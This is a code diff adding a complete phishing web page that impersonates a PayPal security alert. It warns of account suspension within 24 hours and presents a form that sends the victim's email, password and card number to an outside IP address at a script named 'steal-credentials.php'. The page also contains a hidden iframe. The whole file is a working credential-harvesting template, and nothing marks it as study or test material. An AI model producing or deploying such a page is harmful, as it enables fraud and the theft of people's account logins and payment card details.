@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Security Alert: Verify Your Account Immediately</title>
+</head>
+<body>
+  <h1>Urgent Notice: Account Suspension in 24 Hours</h1>
+  <p>Dear customer, your PayPal account has been restricted due to suspicious activity. Verify your identity now.</p>
+  <form action="http://198.51.100.23/steal-credentials.php" method="POST">
+    <label>Email Address: <input type="email" name="email" required></label>
+    <label>Password: <input type="password" name="password" required></label>
+    <label>Card Number: <input type="text" name="card" required></label>
+    <button type="submit">Verify Now</button>
+  </form>
+  <iframe src="about:blank" style="display:none; width:0; height:0;"></iframe>
+</body>
+</html>
